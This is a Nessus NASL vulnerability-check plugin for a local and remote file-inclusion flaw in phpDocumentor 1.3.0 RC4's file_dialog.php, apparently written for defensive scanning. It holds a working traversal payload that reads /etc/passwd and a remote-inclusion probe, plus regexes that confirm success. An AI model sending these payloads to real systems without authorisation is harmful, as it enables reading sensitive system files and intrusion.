#
# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#

if (description) {
 script_id(20374);
 script_version("$Revision: 1.4 $");
 script_cve_id("CVE-2005-4593");
 script_bugtraq_id(16080);
 if (defined_func("script_xref"))
 {
  script_xref(name:"OSVDB", value:"22114");
  script_xref(name:"OSVDB", value:"22115");
 }

 name["english"] = "phpDocumentor <= 1.3.0 RC4 Local And Remote File Inclusion Vulnerability";
 script_name(english:name["english"]);
desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to file
inclusion flaws. 

Description :

phpDocumentor is a automatic documentation generator for PHP. 

The remote host appears to be running the web-interface of
phpDocumentor. 

This version does not properly sanitize user input in the
'file_dialog.php' file and a test file called 'bug-559668.php' It is
possible for an attacker to include remote files and execute arbitrary
commands on the remote system, and display the content of sensitive
files. 

This flaw is exploitable if PHP's 'register_globals' setting is
enabled. 
 
See also :

http://retrogod.altervista.org/phpdocumentor_130rc4_incl_expl.html
http://marc.theaimsgroup.com/?l=bugtraq&m=113587730223824&w=2

Solution :

Disable PHP's 'register_globals' setting.

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
 script_description(english:desc["english"]);

 summary["english"] = "Check if phpDocumentor is vulnerable to remote file inclusion flaws";
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2006 Ferdy Riphagen");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# Check a few directories.
if (thorough_tests) dirs = make_list("/phpdocumentor", "/phpdoc", "/PhpDocumentor", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{ 
 # Check if we can find phpDocumentor installed. 
 res = http_get_cache(item:string(dir, "/docbuilder/top.php"), port:port);
 debug_print("res: ", res, "\n");
 if (res == NULL) exit(0);

 if (egrep(pattern:"docBuilder.*phpDocumentor v[0-9.]+.*Web Interface", string:res))
 {
  # Try the local file inclusion flaw.
  exploit[0] = "../../../../../../../etc/passwd%00";
  result = "root:.*:0:[01]:.*:";
  error = "Warning.*main.*/etc/passwd.*failed to open stream";
 
  if (thorough_tests)
  {
   # Try to grab a remote file.
   exploit[1] = string("http://", get_host_name(), "/robots.txt%00");
   result = "root:.*:0:[01]:.*:|User-agent:";  
   error = "Warning.*main.*/etc/passwd.*failed to open stream|Warning.*/robots.txt.*failed to open stream"; 
  }

  for(exp = 0; exploit[exp]; exp++) 
  {
   req = http_get(item:string(dir, "/docbuilder/file_dialog.php?root_dir=", exploit[exp]), port:port);
   debug_print("req: ", req, "\n");
   
   recv = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
   if (recv == NULL) exit(0);
   
   if (egrep(pattern:result, string:recv) ||
       # Check if there is a error that the file can not be found.
       egrep(pattern:error, string:recv)) 
   {
    security_warning(port);
    exit(0);
   } 
  }
 }
}
